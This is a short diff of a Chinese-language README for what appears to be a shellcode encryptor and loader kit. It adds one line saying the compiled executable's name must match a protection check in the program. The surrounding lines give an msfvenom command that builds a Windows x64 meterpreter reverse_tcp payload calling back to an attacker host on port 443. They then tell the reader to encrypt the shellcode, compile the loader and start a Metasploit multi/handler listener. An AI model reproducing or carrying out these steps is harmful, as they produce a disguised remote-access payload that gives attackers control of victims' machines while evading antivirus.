@@ -10,6 +10,7 @@ msfvenom LHOST=x.x.x.x LPORT=443 -p windows/x64/meterpreter/reverse_tcp -f c
 将生成的shellcode复制到加密器.c的buf变量中并编译运行
 ## 编译加载器
 将加密后的shellcode 复制到加载器的shellcode变量中编译
+PS:编译出来的可执行程序名称应该和程序中的防护一至
 ## 准备msf监听器
 msfconsole<br />
 use exploit/multi/handler<br />
